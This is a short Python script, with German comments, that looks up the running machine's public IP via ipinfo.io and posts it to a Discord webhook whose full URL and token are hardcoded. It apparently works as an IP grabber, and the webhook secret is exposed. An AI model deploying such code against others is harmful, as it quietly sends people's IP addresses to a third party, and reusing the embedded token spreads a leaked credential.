import requests
import json
from discord_webhook import DiscordWebhook, DiscordEmbed

def get():
    endpoint = "https://ipinfo.io/json"
    response = requests.get(endpoint, verify = True)

    if response.status_code !=200:
        return "Status: ", response.status_code, "Fehler bei der Anfrage."
        exit()

    data = response.json()

    return data["ip"]

ipretreived = get()

#paste your Webhook URL in the ""
webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1055569104905453589/NecAx0SnoVKl5HnuhsJAs0mCVFHiSlRBLyKD8xMy2oIVixbMvAQK8uN2XhY3-JC_qxCB")

#color in HEX format "" or in RGB without the ""
embed0 = DiscordEmbed(title="Die IP-Adresse", description=ipretreived, color="ffc0cb")

#adds the embed to the Weebhook
webhook.add_embed(embed0)

response = webhook.execute()
